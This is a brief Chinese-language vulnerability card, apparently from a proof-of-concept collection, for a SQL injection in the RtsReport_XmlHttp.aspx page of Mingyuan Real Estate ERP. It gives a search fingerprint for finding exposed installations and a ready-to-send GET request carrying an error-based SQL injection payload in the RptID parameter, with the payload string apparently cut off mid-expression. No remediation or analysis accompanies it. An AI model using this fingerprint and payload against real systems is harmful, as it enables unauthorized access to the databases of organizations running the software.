# 明源地产ERPRtsReport_XmlHttp.aspx存在SQL注入漏洞

- **系统**：明源地产　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`GET /Report/RtsReport_XmlHttp.aspx/?ywtype=SaveGeneralParam&RptID=1%27%2B(SELECT%20CHAR(65)%2BCHAR(119)%2BCHAR(102)%2BCHAR(103)%20WHERE%204294%3D4294%20AND%203472%20IN%20(SELECT%20(CHAR(113)%2BCHAR(107)%2BCHAR(106)%2BCHAR(113)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(3472%3D3472)%20THEN%20CHAR(49)%20`
- **预期**：200　|　—